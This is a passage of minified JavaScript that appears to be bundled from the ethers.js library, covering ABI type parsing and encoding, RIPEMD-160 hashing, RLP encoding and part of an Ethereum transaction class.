                }
                ), {});
                return this.coders.forEach(( (r, n) => {
                    let o = r.localName;
                    o && 1 === t[o] && ("length" === o && (o = "_length"),
                    null == e[o] && (e[o] = e[n]))
                }
                )),
                Object.freeze(e)
            }
            encode(e, t) {
                const r = w_.dereference(t, "tuple");
                return E_(e, this.coders, r)
            }
            decode(e) {
                return P_(e, this.coders)
            }
        }
        var U_;
        function D_(e) {
            const t = new Set;
            return e.forEach((e => t.add(e))),
            Object.freeze(t)
        }
        D_("external public payable override".split(" "));
        const L_ = "constant external internal payable private public pure view override"
          , j_ = (D_(L_.split(" ")),
        "constructor error event fallback function receive struct")
          , z_ = (D_(j_.split(" ")),
        "calldata memory storage payable indexed")
          , V_ = D_(z_.split(" "))
          , H_ = D_([j_, z_, "tuple returns", L_].join(" ").split(" "))
          , q_ = {
            "(": "OPEN_PAREN",
            ")": "CLOSE_PAREN",
            "[": "OPEN_BRACKET",
            "]": "CLOSE_BRACKET",
            ",": "COMMA",
            "@": "AT"
        }
          , G_ = new RegExp("^(\\s*)")
          , $_ = new RegExp("^([0-9]+)")
          , K_ = new RegExp("^([a-zA-Z$_][a-zA-Z0-9$_]*)")
          , Z_ = new RegExp("^([a-zA-Z$_][a-zA-Z0-9$_]*)$")
          , Y_ = new RegExp("^(address|bool|bytes([0-9]*)|string|u?int([0-9]*))$");
        var J_ = new WeakMap
          , X_ = new WeakMap
          , Q_ = new WeakSet;
        class eW {
            get offset() {
                return SS(J_, this)
            }
            get length() {
                return SS(X_, this).length - SS(J_, this)
            }
            constructor(e) {
                DB(this, Q_),
                ES(this, J_, void 0),
                ES(this, X_, void 0),
                CS(J_, this, 0),
                CS(X_, this, e.slice())
            }
            clone() {
                return new eW(SS(X_, this))
            }
            reset() {
                CS(J_, this, 0)
            }
            popKeyword(e) {
                const t = this.peek();
                if ("KEYWORD" !== t.type || !e.has(t.text))
                    throw new Error("expected keyword ".concat(t.text));
                return this.pop().text
            }
            popType(e) {
                if (this.peek().type !== e) {
                    const t = this.peek();
                    throw new Error("expected ".concat(e, "; got ").concat(t.type, " ").concat(JSON.stringify(t.text)))
                }
                return this.pop().text
            }
            popParen() {
                const e = this.peek();
                if ("OPEN_PAREN" !== e.type)
                    throw new Error("bad start");
                const t = PS(Q_, this, tW).call(this, SS(J_, this) + 1, e.match + 1);
                return CS(J_, this, e.match + 1),
                t
            }
            popParams() {
                const e = this.peek();
                if ("OPEN_PAREN" !== e.type)
                    throw new Error("bad start");
                const t = [];
                for (; SS(J_, this) < e.match - 1; ) {
                    const e = this.peek().linkNext;
                    t.push(PS(Q_, this, tW).call(this, SS(J_, this) + 1, e)),
                    CS(J_, this, e)
                }
                return CS(J_, this, e.match + 1),
                t
            }
            peek() {
                if (SS(J_, this) >= SS(X_, this).length)
                    throw new Error("out-of-bounds");
                return SS(X_, this)[SS(J_, this)]
            }
            peekKeyword(e) {
                const t = this.peekType("KEYWORD");
                return null != t && e.has(t) ? t : null
            }
            peekType(e) {
                if (0 === this.length)
                    return null;
                const t = this.peek();
                return t.type === e ? t.text : null
            }
            pop() {
                var e;
                const t = this.peek();
                return CS(J_, this, (e = SS(J_, this),
                e++,
                e)),
                t
            }
            toString() {
                const e = [];
                for (let t = SS(J_, this); t < SS(X_, this).length; t++) {
                    const r = SS(X_, this)[t];
                    e.push("".concat(r.type, ":").concat(r.text))
                }
                return "<TokenString ".concat(e.join(" "), ">")
            }
        }
        function tW() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0
              , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
            return new U_(SS(X_, this).slice(e, t).map((t => Object.freeze(Object.assign({}, t, {
                match: t.match - e,
                linkBack: t.linkBack - e,
                linkNext: t.linkNext - e
            })))))
        }
        function rW(e) {
            const t = []
              , r = t => {
                const r = i < e.length ? JSON.stringify(e[i]) : "$EOI";
                throw new Error("invalid token ".concat(r, " at ").concat(i, ": ").concat(t))
            }
            ;
            let n = []
              , o = []
              , i = 0;
            for (; i < e.length; ) {
                let s = e.substring(i)
                  , a = s.match(G_);
                a && (i += a[1].length,
                s = e.substring(i));
                const c = {
                    depth: n.length,
                    linkBack: -1,
                    linkNext: -1,
                    match: -1,
                    type: "",
                    text: "",
                    offset: i,
                    value: -1
                };
                t.push(c);
                let l = q_[s[0]] || "";
                if (l) {
                    if (c.type = l,
                    c.text = s[0],
                    i++,
                    "OPEN_PAREN" === l)
                        n.push(t.length - 1),
                        o.push(t.length - 1);
                    else if ("CLOSE_PAREN" == l)
                        0 === n.length && r("no matching open bracket"),
                        c.match = n.pop(),
                        t[c.match].match = t.length - 1,
                        c.depth--,
                        c.linkBack = o.pop(),
                        t[c.linkBack].linkNext = t.length - 1;
                    else if ("COMMA" === l)
                        c.linkBack = o.pop(),
                        t[c.linkBack].linkNext = t.length - 1,
                        o.push(t.length - 1);
                    else if ("OPEN_BRACKET" === l)
                        c.type = "BRACKET";
                    else if ("CLOSE_BRACKET" === l) {
                        let e = t.pop().text;
                        if (t.length > 0 && "NUMBER" === t[t.length - 1].type) {
                            const r = t.pop().text;
                            e = r + e,
                            t[t.length - 1].value = cI(r)
                        }
                        if (0 === t.length || "BRACKET" !== t[t.length - 1].type)
                            throw new Error("missing opening bracket");
                        t[t.length - 1].text += e
                    }
                } else if (a = s.match(K_),
                a) {
                    if (c.text = a[1],
                    i += c.text.length,
                    H_.has(c.text)) {
                        c.type = "KEYWORD";
                        continue
                    }
                    if (c.text.match(Y_)) {
                        c.type = "TYPE";
                        continue
                    }
                    c.type = "ID"
                } else {
                    if (a = s.match($_),
                    !a)
                        throw new Error("unexpected token ".concat(JSON.stringify(s[0]), " at position ").concat(i));
                    c.text = a[1],
                    c.type = "NUMBER",
                    i += c.text.length
                }
            }
            return new eW(t.map((e => Object.freeze(e))))
        }
        function nW(e, t) {
            const r = new Set;
            for (; ; ) {
                const n = e.peekType("KEYWORD");
                if (null == n || t && !t.has(n))
                    break;
                if (e.pop(),
                r.has(n))
                    throw new Error("duplicate keywords: ".concat(JSON.stringify(n)));
                r.add(n)
            }
            return Object.freeze(r)
        }
        U_ = eW;
        const oW = new RegExp(/^(.*)\[([0-9]*)\]$/);
        function iW(e) {
            const t = e.match(Y_);
            if (NS(t, "invalid type", "type", e),
            "uint" === e)
                return "uint256";
            if ("int" === e)
                return "int256";
            if (t[2]) {
                const r = parseInt(t[2]);
                NS(0 !== r && r <= 32, "invalid bytes length", "type", e)
            } else if (t[3]) {
                const r = parseInt(t[3]);
                NS(0 !== r && r <= 256 && r % 8 === 0, "invalid numeric width", "type", e)
            }
            return e
        }
        const sW = {}
          , aW = Symbol.for("_ethers_internal")
          , cW = "_ParamTypeInternal";
        var lW = new WeakSet;
        class uW {
            constructor(e, t, r, n, o, i, s, a) {
                if (DB(this, lW),
                (0,
                CI.A)(this, "name", void 0),
                (0,
                CI.A)(this, "type", void 0),
                (0,
                CI.A)(this, "baseType", void 0),
                (0,
                CI.A)(this, "indexed", void 0),
                (0,
                CI.A)(this, "components", void 0),
                (0,
                CI.A)(this, "arrayLength", void 0),
                (0,
                CI.A)(this, "arrayChildren", void 0),
                LS(e, sW, "ParamType"),
                Object.defineProperty(this, aW, {
                    value: cW
                }),
                i && (i = Object.freeze(i.slice())),
                "array" === n) {
                    if (null == s || null == a)
                        throw new Error("")
                } else if (null != s || null != a)
                    throw new Error("");
                if ("tuple" === n) {
                    if (null == i)
                        throw new Error("")
                } else if (null != i)
                    throw new Error("");
                _S(this, {
                    name: t,
                    type: r,
                    baseType: n,
                    indexed: o,
                    components: i,
                    arrayLength: s,
                    arrayChildren: a
                })
            }
            format(e) {
                if (null == e && (e = "sighash"),
                "json" === e) {
                    const t = this.name || "";
                    if (this.isArray()) {
                        const e = JSON.parse(this.arrayChildren.format("json"));
                        return e.name = t,
                        e.type += "[".concat(this.arrayLength < 0 ? "" : String(this.arrayLength), "]"),
                        JSON.stringify(e)
                    }
                    const r = {
                        type: "tuple" === this.baseType ? "tuple" : this.type,
                        name: t
                    };
                    return "boolean" === typeof this.indexed && (r.indexed = this.indexed),
                    this.isTuple() && (r.components = this.components.map((t => JSON.parse(t.format(e))))),
                    JSON.stringify(r)
                }
                let t = "";
                return this.isArray() ? (t += this.arrayChildren.format(e),
                t += "[".concat(this.arrayLength < 0 ? "" : String(this.arrayLength), "]")) : this.isTuple() ? t += "(" + this.components.map((t => t.format(e))).join("full" === e ? ", " : ",") + ")" : t += this.type,
                "sighash" !== e && (!0 === this.indexed && (t += " indexed"),
                "full" === e && this.name && (t += " " + this.name)),
                t
            }
            isArray() {
                return "array" === this.baseType
            }
            isTuple() {
                return "tuple" === this.baseType
            }
            isIndexable() {
                return null != this.indexed
            }
            walk(e, t) {
                if (this.isArray()) {
                    if (!Array.isArray(e))
                        throw new Error("invalid array value");
                    if (-1 !== this.arrayLength && e.length !== this.arrayLength)
                        throw new Error("array is wrong length");
                    const r = this;
                    return e.map((e => r.arrayChildren.walk(e, t)))
                }
                if (this.isTuple()) {
                    if (!Array.isArray(e))
                        throw new Error("invalid tuple value");
                    if (e.length !== this.components.length)
                        throw new Error("array is wrong length");
                    const r = this;
                    return e.map(( (e, n) => r.components[n].walk(e, t)))
                }
                return t(this.type, e)
            }
            async walkAsync(e, t) {
                const r = []
                  , n = [e];
                return PS(lW, this, dW).call(this, r, e, t, (e => {
                    n[0] = e
                }
                )),
                r.length && await Promise.all(r),
                n[0]
            }
            static from(e, t) {
                if (uW.isParamType(e))
                    return e;
                if ("string" === typeof e)
                    try {
                        return uW.from(rW(e), t)
                    } catch (s) {
                        NS(!1, "invalid param type", "obj", e)
                    }
                else if (e instanceof eW) {
                    let r = ""
                      , n = ""
                      , o = null;
                    nW(e, D_(["tuple"])).has("tuple") || e.peekType("OPEN_PAREN") ? (n = "tuple",
                    o = e.popParams().map((e => uW.from(e))),
                    r = "tuple(".concat(o.map((e => e.format())).join(","), ")")) : (r = iW(e.popType("TYPE")),
                    n = r);
                    let i = null
                      , s = null;
                    for (; e.length && e.peekType("BRACKET"); ) {
                        const t = e.pop();
                        i = new uW(sW,"",r,n,null,o,s,i),
                        s = t.value,
                        r += t.text,
                        n = "array",
                        o = null
                    }
                    let a = null;
                    if (nW(e, V_).has("indexed")) {
                        if (!t)
                            throw new Error("");
                        a = !0
                    }
                    const c = e.peekType("ID") ? e.pop().text : "";
                    if (e.length)
                        throw new Error("leftover tokens");
                    return new uW(sW,c,r,n,a,o,s,i)
                }
                const r = e.name;
                NS(!r || "string" === typeof r && r.match(Z_), "invalid name", "obj.name", r);
                let n = e.indexed;
                null != n && (NS(t, "parameter cannot be indexed", "obj.indexed", e.indexed),
                n = !!n);
                let o = e.type
                  , i = o.match(oW);
                if (i) {
                    const t = parseInt(i[2] || "-1")
                      , s = uW.from({
                        type: i[1],
                        components: e.components
                    });
                    return new uW(sW,r || "",o,"array",n,null,t,s)
                }
                if ("tuple" === o || o.startsWith("tuple(") || o.startsWith("(")) {
                    const t = null != e.components ? e.components.map((e => uW.from(e))) : null;
                    return new uW(sW,r || "",o,"tuple",n,t,null,null)
                }
                return o = iW(e.type),
                new uW(sW,r || "",o,o,n,null,null,null)
            }
            static isParamType(e) {
                return e && e[aW] === cW
            }
        }
        function dW(e, t, r, n) {
            if (this.isArray()) {
                if (!Array.isArray(t))
                    throw new Error("invalid array value");
                if (-1 !== this.arrayLength && t.length !== this.arrayLength)
                    throw new Error("array is wrong length");
                const o = this.arrayChildren
                  , i = t.slice();
                return i.forEach(( (t, n) => {
                    PS(lW, o, dW).call(o, e, t, r, (e => {
                        i[n] = e
                    }
                    ))
                }
                )),
                void n(i)
            }
            if (this.isTuple()) {
                const o = this.components;
                let i;
                if (Array.isArray(t))
                    i = t.slice();
                else {
                    if (null == t || "object" !== typeof t)
                        throw new Error("invalid tuple value");
                    i = o.map((e => {
                        if (!e.name)
                            throw new Error("cannot use object value with unnamed components");
                        if (!(e.name in t))
                            throw new Error("missing value for component ".concat(e.name));
                        return t[e.name]
                    }
                    ))
                }
                if (i.length !== this.components.length)
                    throw new Error("array is wrong length");
                return i.forEach(( (t, n) => {
                    var s;
                    PS(lW, s = o[n], dW).call(s, e, t, r, (e => {
                        i[n] = e
                    }
                    ))
                }
                )),
                void n(i)
            }
            const o = r(this.type, t);
            o.then ? e.push(async function() {
                n(await o)
            }()) : n(o)
        }
        const hW = new Map;
        hW.set(0, "GENERIC_PANIC"),
        hW.set(1, "ASSERT_FALSE"),
        hW.set(17, "OVERFLOW"),
        hW.set(18, "DIVIDE_BY_ZERO"),
        hW.set(33, "ENUM_RANGE_ERROR"),
        hW.set(34, "BAD_STORAGE_DATA"),
        hW.set(49, "STACK_UNDERFLOW"),
        hW.set(50, "ARRAY_RANGE_ERROR"),
        hW.set(65, "OUT_OF_MEMORY"),
        hW.set(81, "UNINITIALIZED_FUNCTION_CALL");
        const fW = new RegExp(/^bytes([0-9]*)$/)
          , pW = new RegExp(/^(u?int)([0-9]*)$/);
        let gW = null
          , yW = 1024;
        var mW = new WeakSet;
        class bW {
            constructor() {
                DB(this, mW)
            }
            getDefaultValue(e) {
                const t = e.map((e => PS(mW, this, vW).call(this, uW.from(e))));
                return new F_(t,"_").defaultValue()
            }
            encode(e, t) {
                FS(t.length, e.length, "types/values length mismatch");
                const r = e.map((e => PS(mW, this, vW).call(this, uW.from(e))))
                  , n = new F_(r,"_")
                  , o = new o_;
                return n.encode(o, t),
                o.data
            }
            decode(e, t, r) {
                const n = e.map((e => PS(mW, this, vW).call(this, uW.from(e))));
                return new F_(n,"_").decode(new h_(t,r,yW))
            }
            static _setDefaultMaxInflation(e) {
                NS("number" === typeof e && Number.isInteger(e), "invalid defaultMaxInflation factor", "value", e),
                yW = e
            }
            static defaultAbiCoder() {
                return null == gW && (gW = new bW),
                gW
            }
            static getBuiltinCallException(e, t, r) {
                return function(e, t, r, n) {
                    let o = "missing revert data"
                      , i = null
                      , s = null;
                    if (r) {
                        o = "execution reverted";
                        const e = zS(r);
                        if (r = $S(r),
                        0 === e.length)
                            o += " (no data present; likely require(false) occurred",
                            i = "require(false)";
                        else if (e.length % 32 !== 4)
                            o += " (could not decode reason; invalid data length)";
                        else if ("0x08c379a0" === $S(e.slice(0, 4)))
                            try {
                                i = n.decode(["string"], e.slice(4))[0],
                                s = {
                                    signature: "Error(string)",
                                    name: "Error",
                                    args: [i]
                                },
                                o += ": ".concat(JSON.stringify(i))
                            } catch (c) {
                                o += " (could not decode reason; invalid string data)"
                            }
                        else if ("0x4e487b71" === $S(e.slice(0, 4)))
                            try {
                                const t = Number(n.decode(["uint256"], e.slice(4))[0]);
                                s = {
                                    signature: "Panic(uint256)",
                                    name: "Panic",
                                    args: [t]
                                },
                                i = "Panic due to ".concat(hW.get(t) || "UNKNOWN", "(").concat(t, ")"),
                                o += ": ".concat(i)
                            } catch (c) {
                                o += " (could not decode panic code)"
                            }
                        else
                            o += " (unknown custom error)"
                    }
                    const a = {
                        to: t.to ? Nx(t.to) : null,
                        data: t.data || "0x"
                    };
                    return t.from && (a.from = Nx(t.from)),
                    kS(o, "CALL_EXCEPTION", {
                        action: e,
                        data: r,
                        reason: i,
                        transaction: a,
                        invocation: null,
                        revert: s
                    })
                }(e, t, r, bW.defaultAbiCoder())
            }
        }
        function vW(e) {
            if (e.isArray())
                return new C_(PS(mW, this, vW).call(this, e.arrayChildren),e.arrayLength,e.name);
            if (e.isTuple())
                return new F_(e.components.map((e => PS(mW, this, vW).call(this, e))),e.name);
            switch (e.baseType) {
            case "address":
                return new T_(e.name);
            case "bool":
                return new S_(e.name);
            case "string":
                return new N_(e.name);
            case "bytes":
                return new B_(e.name);
            case "":
                return new __(e.name)
            }
            let t = e.type.match(pW);
            if (t) {
                let r = parseInt(t[2] || "256");
                return NS(0 !== r && r <= 256 && r % 8 === 0, "invalid " + t[1] + " bit length", "param", e),
                new M_(r / 8,"int" === t[1],e.name)
            }
            if (t = e.type.match(fW),
            t) {
                let r = parseInt(t[1]);
                return NS(0 !== r && r <= 32, "invalid bytes length", "param", e),
                new x_(r,e.name)
            }
            NS(!1, "invalid type", "type", e.type)
        }
        const wW = new Uint8Array([7, 4, 13, 1, 10, 6, 15, 3, 12, 0, 9, 5, 2, 14, 11, 8])
          , TW = Uint8Array.from({
            length: 16
        }, ( (e, t) => t))
          , AW = TW.map((e => (9 * e + 5) % 16));
        let EW = [TW]
          , PW = [AW];
        for (let r = 0; r < 4; r++)
            for (let e of [EW, PW])
                e.push(e[r].map((e => wW[e])));
        const CW = [[11, 14, 15, 12, 5, 8, 7, 9, 11, 13, 14, 15, 6, 7, 9, 8], [12, 13, 11, 15, 6, 9, 9, 7, 12, 15, 11, 13, 7, 8, 7, 7], [13, 15, 14, 11, 7, 7, 6, 8, 13, 14, 13, 12, 5, 5, 6, 9], [14, 11, 12, 14, 8, 6, 5, 5, 15, 12, 15, 14, 9, 9, 8, 6], [15, 12, 13, 13, 9, 5, 8, 6, 14, 11, 12, 11, 8, 6, 5, 5]].map((e => new Uint8Array(e)))
          , SW = EW.map(( (e, t) => e.map((e => CW[t][e]))))
          , IW = PW.map(( (e, t) => e.map((e => CW[t][e]))))
          , BW = new Uint32Array([0, 1518500249, 1859775393, 2400959708, 2840853838])
          , xW = new Uint32Array([1352829926, 1548603684, 1836072691, 2053994217, 0])
          , OW = (e, t) => e << t | e >>> 32 - t;
        function _W(e, t, r, n) {
            return 0 === e ? t ^ r ^ n : 1 === e ? t & r | ~t & n : 2 === e ? (t | ~r) ^ n : 3 === e ? t & n | r & ~n : t ^ (r | ~n)
        }
        const WW = new Uint32Array(16);
        class RW extends ZI {
            constructor() {
                super(64, 20, 8, !0),
                this.h0 = 1732584193,
                this.h1 = -271733879,
                this.h2 = -1732584194,
                this.h3 = 271733878,
                this.h4 = -1009589776
            }
            get() {
                const {h0: e, h1: t, h2: r, h3: n, h4: o} = this;
                return [e, t, r, n, o]
            }
            set(e, t, r, n, o) {
                this.h0 = 0 | e,
                this.h1 = 0 | t,
                this.h2 = 0 | r,
                this.h3 = 0 | n,
                this.h4 = 0 | o
            }
            process(e, t) {
                for (let h = 0; h < 16; h++,
                t += 4)
                    WW[h] = e.getUint32(t, !0);
                let r = 0 | this.h0
                  , n = r
                  , o = 0 | this.h1
                  , i = o
                  , s = 0 | this.h2
                  , a = s
                  , c = 0 | this.h3
                  , l = c
                  , u = 0 | this.h4
                  , d = u;
                for (let h = 0; h < 5; h++) {
                    const e = 4 - h
                      , t = BW[h]
                      , f = xW[h]
                      , p = EW[h]
                      , g = PW[h]
                      , y = SW[h]
                      , m = IW[h];
                    for (let n = 0; n < 16; n++) {
                        const e = OW(r + _W(h, o, s, c) + WW[p[n]] + t, y[n]) + u | 0;
                        r = u,
                        u = c,
                        c = 0 | OW(s, 10),
                        s = o,
                        o = e
                    }
                    for (let r = 0; r < 16; r++) {
                        const t = OW(n + _W(e, i, a, l) + WW[g[r]] + f, m[r]) + d | 0;
                        n = d,
                        d = l,
                        l = 0 | OW(a, 10),
                        a = i,
                        i = t
                    }
                }
                this.set(this.h1 + s + l | 0, this.h2 + c + d | 0, this.h3 + u + n | 0, this.h4 + r + i | 0, this.h0 + o + a | 0)
            }
            roundClean() {
                WW.fill(0)
            }
            destroy() {
                this.destroyed = !0,
                this.buffer.fill(0),
                this.set(0, 0, 0, 0, 0)
            }
        }
        const kW = zI(( () => new RW));
        let MW = !1;
        const NW = function(e) {
            return kW(e)
        };
        let FW = NW;
        function UW(e) {
            const t = zS(e, "data");
            return $S(FW(t))
        }
        UW._ = NW,
        UW.lock = function() {
            MW = !0
        }
        ,
        UW.register = function(e) {
            if (MW)
                throw new TypeError("ripemd160 is locked");
            FW = e
        }
        ,
        Object.freeze(UW);
        let DW = !1;
        const LW = function(e) {
            return new Uint8Array(function(e) {
                MS(null != wB, "platform does not support secure random numbers", "UNSUPPORTED_OPERATION", {
                    operation: "randomBytes"
                }),
                NS(Number.isInteger(e) && e > 0 && e <= 1024, "invalid length", "length", e);
                const t = new Uint8Array(e);
                return wB.getRandomValues(t),
                t
            }(e))
        };
        let jW = LW;
        function zW(e) {
            return jW(e)
        }
        async function VW(e, t) {
            const r = await t;
            return null != r && "0x0000000000000000000000000000000000000000" !== r || (MS("string" !== typeof e, "unconfigured name", "UNCONFIGURED_NAME", {
                value: e
            }),
            NS(!1, "invalid AddressLike value; did not resolve to a value address", "target", e)),
            Nx(r)
        }
        function HW(e, t) {
            return "string" === typeof e ? e.match(/^0x[0-9a-f]{40}$/i) ? Nx(e) : (MS(null != t, "ENS resolution requires a provider", "UNSUPPORTED_OPERATION", {
                operation: "resolveName"
            }),
            VW(e, t.resolveName(e))) : (r = e) && "function" === typeof r.getAddress ? VW(e, e.getAddress()) : e && "function" === typeof e.then ? VW(e, e) : void NS(!1, "unsupported addressable value", "target", e);
            var r
        }
        zW._ = LW,
        zW.lock = function() {
            DW = !0
        }
        ,
        zW.register = function(e) {
            if (DW)
                throw new Error("randomBytes is locked");
            jW = e
        }
        ,
        Object.freeze(zW);
        const qW = "0x0000000000000000000000000000000000000000";
        function GW(e) {
            let t = e.toString(16);
            for (; t.length < 2; )
                t = "0" + t;
            return "0x" + t
        }
        function $W(e, t, r) {
            let n = 0;
            for (let o = 0; o < r; o++)
                n = 256 * n + e[t + o];
            return n
        }
        function KW(e, t, r, n) {
            const o = [];
            for (; r < t + 1 + n; ) {
                const i = ZW(e, r);
                o.push(i.result),
                MS((r += i.consumed) <= t + 1 + n, "child data too short", "BUFFER_OVERRUN", {
                    buffer: e,
                    length: n,
                    offset: t
                })
            }
            return {
                consumed: 1 + n,
                result: o
            }
        }
        function ZW(e, t) {
            MS(0 !== e.length, "data too short", "BUFFER_OVERRUN", {
                buffer: e,
                length: 0,
                offset: 1
            });
            const r = t => {
                MS(t <= e.length, "data short segment too short", "BUFFER_OVERRUN", {
                    buffer: e,
                    length: e.length,
                    offset: t
                })
            }
            ;
            if (e[t] >= 248) {
                const n = e[t] - 247;
                r(t + 1 + n);
                const o = $W(e, t + 1, n);
                return r(t + 1 + n + o),
                KW(e, t, t + 1 + n, n + o)
            }
            if (e[t] >= 192) {
                const n = e[t] - 192;
                return r(t + 1 + n),
                KW(e, t, t + 1, n)
            }
            if (e[t] >= 184) {
                const n = e[t] - 183;
                r(t + 1 + n);
                const o = $W(e, t + 1, n);
                r(t + 1 + n + o);
                return {
                    consumed: 1 + n + o,
                    result: $S(e.slice(t + 1 + n, t + 1 + n + o))
                }
            }
            if (e[t] >= 128) {
                const n = e[t] - 128;
                r(t + 1 + n);
                return {
                    consumed: 1 + n,
                    result: $S(e.slice(t + 1, t + 1 + n))
                }
            }
            return {
                consumed: 1,
                result: GW(e[t])
            }
        }
        function YW(e) {
            const t = zS(e, "data")
              , r = ZW(t, 0);
            return NS(r.consumed === t.length, "unexpected junk after rlp payload", "data", e),
            r.result
        }
        function JW(e) {
            const t = [];
            for (; e; )
                t.unshift(255 & e),
                e >>= 8;
            return t
        }
        function XW(e) {
            if (Array.isArray(e)) {
                let t = [];
                if (e.forEach((function(e) {
                    t = t.concat(XW(e))
                }
                )),
                t.length <= 55)
                    return t.unshift(192 + t.length),
                    t;
                const r = JW(t.length);
                return r.unshift(247 + r.length),
                r.concat(t)
            }
            const t = Array.prototype.slice.call(zS(e, "object"));
            if (1 === t.length && t[0] <= 127)
                return t;
            if (t.length <= 55)
                return t.unshift(128 + t.length),
                t;
            const r = JW(t.length);
            return r.unshift(183 + r.length),
            r.concat(t)
        }
        const QW = "0123456789abcdef";
        function eR(e) {
            let t = "0x";
            for (const r of XW(e))
                t += QW[r >> 4],
                t += QW[15 & r];
            return t
        }
        function tR(e, t) {
            return {
                address: Nx(e),
                storageKeys: t.map(( (e, t) => (NS(HS(e, 32), "invalid slot", "storageKeys[".concat(t, "]"), e),
                e.toLowerCase())))
            }
        }
        function rR(e) {
            if (Array.isArray(e))
                return e.map(( (t, r) => Array.isArray(t) ? (NS(2 === t.length, "invalid slot set", "value[".concat(r, "]"), t),
                tR(t[0], t[1])) : (NS(null != t && "object" === typeof t, "invalid address-slot set", "value", e),
                tR(t.address, t.storageKeys))));
            NS(null != e && "object" === typeof e, "invalid access list", "value", e);
            const t = Object.keys(e).map((t => {
                const r = e[t].reduce(( (e, t) => (e[t] = !0,
                e)), {});
                return tR(t, Object.keys(r).sort())
            }
            ));
            return t.sort(( (e, t) => e.address.localeCompare(t.address))),
            t
        }
        const nR = BigInt(0)
          , oR = BigInt(2)
          , iR = BigInt(27)
          , sR = BigInt(28)
          , aR = BigInt(35)
          , cR = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
          , lR = 131072;
        function uR(e, t) {
            let r = e.toString(16);
            for (; r.length < 2; )
                r = "0" + r;
            return r += BB(t).substring(4),
            "0x" + r
        }
        function dR(e) {
            return "0x" === e ? null : Nx(e)
        }
        function hR(e, t) {
            try {
                return rR(e)
            } catch (r) {
                NS(!1, r.message, t, e)
            }
        }
        function fR(e, t) {
            return "0x" === e ? 0 : cI(e, t)
        }
        function pR(e, t) {
            if ("0x" === e)
                return nR;
            const r = oI(e, t);
            return NS(r <= cR, "value exceeds uint size", t, r),
            r
        }
        function gR(e, t) {
            const r = oI(e, "value")
              , n = uI(r);
            return NS(n.length <= 32, "value too large", "tx.".concat(t), r),
            n
        }
        function yR(e) {
            return rR(e).map((e => [e.address, e.storageKeys]))
        }
        function mR(e, t) {
            NS(Array.isArray(e), "invalid ".concat(t), "value", e);
            for (let r = 0; r < e.length; r++)
                NS(HS(e[r], 32), "invalid ${ param } hash", "value[".concat(r, "]"), e[r]);
            return e
        }
        function bR(e, t) {
            let r;
            try {
                if (r = fR(t[0], "yParity"),
                0 !== r && 1 !== r)
                    throw new Error("bad yParity")
            } catch (s) {
                NS(!1, "invalid yParity", "yParity", t[0])
            }
            const n = XS(t[1], 32)
              , o = XS(t[2], 32)
              , i = PI.from({
                r: n,
                s: o,
                yParity: r
            });
            e.signature = i
        }
        var vR = new WeakMap
          , wR = new WeakMap
          , TR = new WeakMap
          , AR = new WeakMap
          , ER = new WeakMap
          , PR = new WeakMap
          , CR = new WeakMap
          , SR = new WeakMap
          , IR = new WeakMap
          , BR = new WeakMap
          , xR = new WeakMap
          , OR = new WeakMap
          , _R = new WeakMap
          , WR = new WeakMap
          , RR = new WeakMap
          , kR = new WeakMap
          , MR = new WeakSet;
        class NR {
            get type() {
                return SS(vR, this)
            }
            set type(e) {
                switch (e) {
                case null:
                    CS(vR, this, null);
                    break;
                case 0:
                case "legacy":
                    CS(vR, this, 0);
                    break;
                case 1:
                case "berlin":
                case "eip-2930":
                    CS(vR, this, 1);
                    break;
                case 2:
                case "london":
                case "eip-1559":
                    CS(vR, this, 2);
                    break;
                case 3:
                case "cancun":
                case "eip-4844":
                    CS(vR, this, 3);
                    break;
                default:
                    NS(!1, "unsupported transaction type", "type", e)
                }
            }
            get typeName() {
                switch (this.type) {
                case 0:
                    return "legacy";
                case 1:
                    return "eip-2930";
                case 2:
                    return "eip-1559";
                case 3:
                    return "eip-4844"
                }
                return null
            }
            get to() {
                const e = SS(wR, this);
                return null == e && 3 === this.type ? qW : e
            }
            set to(e) {
                CS(wR, this, null == e ? null : Nx(e))
            }
            get nonce() {
                return SS(AR, this)
            }
            set nonce(e) {
                CS(AR, this, cI(e, "value"))
            }
            get gasLimit() {
                return SS(ER, this)
            }
            set gasLimit(e) {
                CS(ER, this, oI(e))
            }
            get gasPrice() {
                const e = SS(PR, this);
                return null != e || 0 !== this.type && 1 !== this.type ? e : nR
            }
            set gasPrice(e) {
                CS(PR, this, null == e ? null : oI(e, "gasPrice"))
            }
            get maxPriorityFeePerGas() {
                const e = SS(CR, this);
                return null == e ? 2 === this.type || 3 === this.type ? nR : null : e
            }
            set maxPriorityFeePerGas(e) {
                CS(CR, this, null == e ? null : oI(e, "maxPriorityFeePerGas"))
            }
            get maxFeePerGas() {
                const e = SS(SR, this);
                return null == e ? 2 === this.type || 3 === this.type ? nR : null : e
            }
            set maxFeePerGas(e) {
                CS(SR, this, null == e ? null : oI(e, "maxFeePerGas"))
            }
            get data() {
                return SS(TR, this)
            }
            set data(e) {
                CS(TR, this, $S(e))
            }
            get value() {
                return SS(IR, this)
            }
            set value(e) {
                CS(IR, this, oI(e, "value"))
            }
            get chainId() {
                return SS(BR, this)
            }
            set chainId(e) {
                CS(BR, this, oI(e))
            }
            get signature() {
                return SS(xR, this) || null
            }
            set signature(e) {
                CS(xR, this, null == e ? null : PI.from(e))
            }
            get accessList() {
                const e = SS(OR, this) || null;
                return null == e ? 1 === this.type || 2 === this.type || 3 === this.type ? [] : null : e
            }
            set accessList(e) {
                CS(OR, this, null == e ? null : rR(e))
            }
            get maxFeePerBlobGas() {
                const e = SS(_R, this);
                return null == e && 3 === this.type ? nR : e
            }
            set maxFeePerBlobGas(e) {
                CS(_R, this, null == e ? null : oI(e, "maxFeePerBlobGas"))
            }
            get blobVersionedHashes() {
                let e = SS(WR, this);
                return null == e && 3 === this.type ? [] : e
            }
            set blobVersionedHashes(e) {
                if (null != e) {
                    NS(Array.isArray(e), "blobVersionedHashes must be an Array", "value", e),
                    e = e.slice();
                    for (let t = 0; t < e.length; t++)
                        NS(HS(e[t], 32), "invalid blobVersionedHash", "value[".concat(t, "]"), e[t])
                }
                CS(WR, this, e)
            }
            get blobs() {
                return null == SS(kR, this) ? null : SS(kR, this).map((e => Object.assign({}, e)))
            }
            set blobs(e) {
                if (null == e)
                    return void CS(kR, this, null);
                const t = []
                  , r = [];
                for (let n = 0; n < e.length; n++) {
                    const o = e[n];
                    if (qS(o)) {
